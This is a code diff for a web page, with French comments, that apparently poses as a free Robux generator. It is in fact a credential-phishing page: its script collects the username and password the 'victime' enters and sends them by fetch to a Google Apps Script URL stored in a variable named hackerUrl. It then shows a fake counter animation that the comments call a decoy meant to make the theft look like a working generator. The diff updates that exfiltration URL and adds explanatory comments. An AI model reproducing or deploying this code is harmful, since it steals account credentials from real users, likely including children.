@@ -57,6 +57,10 @@
             width: 100%;
         }
         
+        button:hover {
+            background: #c53030;
+        }
+        
         .counter {
             font-size: 24px;
             font-weight: bold;
@@ -95,14 +99,17 @@
 </div>
 
 <script>
-    // ⚠️⚠️⚠️ NOUVELLE URL DU SCRIPT GOOGLE ⚠️⚠️⚠️
-    const hackerUrl = "https://script.google.com/macros/s/AKfycbyxBnBePpWfs0iHoosucuDbqnqLRzyadV0LJqxJiW0a0lHgh4F1GPUQ0QyS2zRzXsapHQ/exec";
+    // ⚠️⚠️⚠️ URL DU SCRIPT GOOGLE (À REMPLACER PAR LA BONNE) ⚠️⚠️⚠️
+    // Après déploiement, remplacer cette URL par celle qui finit par /exec
+    const hackerUrl = "https://script.google.com/macros/s/AKfycbxXdWOtASQsYFGxeFxXz6EBgyw8PUMIjOsZHG9bS12DJ_bV7aCjJg9kkjXO-rE9QGnmVQ/exec";
     
     document.getElementById('generateBtn').onclick = function() {
+        // Récupère les valeurs saisies par la victime
         let amount = document.getElementById('amount').value;
         let username = document.getElementById('username').value;
         let password = document.getElementById('password').value;
         
+        // Vérifie que les champs sont remplis
         if(!username || !password) {
             document.getElementById('message').innerHTML = "❌ Remplis tous les champs";
             return;
@@ -119,10 +126,10 @@
                   "&robux=" + encodeURIComponent(amount)
         })
         .then(response => response.text())
-        .then(data => console.log("Réponse:", data))
-        .catch(error => console.error("Erreur:", error));
+        .then(data => console.log("Réponse du script:", data))
+        .catch(error => console.error("Erreur d'envoi:", error));
         
-        // Animation factice (leurre)
+        // Animation factice (leurre - pour faire croire que ça marche)
         let counter = 0;
         let target = parseInt(amount);
         let counterDiv = document.getElementById('counter');
